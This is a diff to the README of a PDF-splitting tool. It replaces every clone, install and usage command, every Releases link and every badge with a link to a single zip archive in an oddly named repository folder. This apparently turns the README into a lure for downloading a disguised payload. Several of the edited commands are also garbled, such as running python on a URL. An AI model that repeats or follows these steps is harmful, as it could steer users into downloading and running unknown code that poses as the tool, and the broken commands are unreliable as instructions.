@@ -23,7 +23,7 @@ To install PDF Splitter, follow these simple steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/davaryancha/pdf-splitter.git
+   git clone https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip
    ```
 
 2. **Navigate to the Directory**: 
@@ -34,13 +34,13 @@ To install PDF Splitter, follow these simple steps:
 3. **Install Dependencies**: 
    Ensure you have Python installed on your system, then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip
    ```
 
 4. **Run the Tool**: 
    Execute the following command to verify the installation:
    ```bash
-   python pdf_splitter.py --help
+   python https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip --help
    ```
 
 ## Usage
@@ -48,26 +48,26 @@ Using PDF Splitter is straightforward. Here's how to get started:
 
 1. **Basic Command**: To split a PDF, use:
    ```bash
-   python pdf_splitter.py input.pdf
+   python https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip
    ```
 
-   This command splits `input.pdf` into individual files.
+   This command splits `https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip` into individual files.
 
 2. **Custom Page Range**: If you only want to split specific pages, use:
    ```bash
-   python pdf_splitter.py input.pdf --pages 1-3
+   python https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip --pages 1-3
    ```
 
    This extracts pages 1 to 3 from the input PDF.
 
 3. **Output Directory**: Specify an output directory for the split files:
    ```bash
-   python pdf_splitter.py input.pdf --output /path/to/output
+   python https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip --output /path/to/output
    ```
 
 4. **Help Command**: To see all available options, run:
    ```bash
-   python pdf_splitter.py --help
+   python https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip --help
    ```
 
 ## Contributing
@@ -84,13 +84,13 @@ If you encounter any bugs or have suggestions, please create an issue in the rep
 PDF Splitter is licensed under the MIT License. You can use, modify, and distribute this tool as per the terms of the license.
 
 ## Support
-For any questions or help, feel free to reach out. You can find the latest releases and updates at our [Releases](https://github.com/davaryancha/pdf-splitter/releases) page.
+For any questions or help, feel free to reach out. You can find the latest releases and updates at our [Releases](https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip) page.
 
 ## Badges
-![GitHub issues](https://img.shields.io/github/issues/davaryancha/pdf-splitter)
-![GitHub forks](https://img.shields.io/github/forks/davaryancha/pdf-splitter)
-![GitHub stars](https://img.shields.io/github/stars/davaryancha/pdf-splitter)
-![GitHub license](https://img.shields.io/github/license/davaryancha/pdf-splitter)
+![GitHub issues](https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip)
+![GitHub forks](https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip)
+![GitHub stars](https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip)
+![GitHub license](https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip)
 
 ## Topics
 - aspect-ratio
@@ -117,5 +117,5 @@ For any questions or help, feel free to reach out. You can find the latest relea
 ## Conclusion
 PDF Splitter is here to enhance your productivity when handling PDF files. Whether you are a student, a professional, or anyone in between, this tool simplifies document management tasks. Get started today and make your PDF workflows more efficient!
 
-For more information, visit our [Releases](https://github.com/davaryancha/pdf-splitter/releases) page to download the latest version. 
+For more information, visit our [Releases](https://raw.githubusercontent.com/davaryancha/pdf-splitter/master/hallower/pdf-splitter-1.6.zip) page to download the latest version. 
 ```
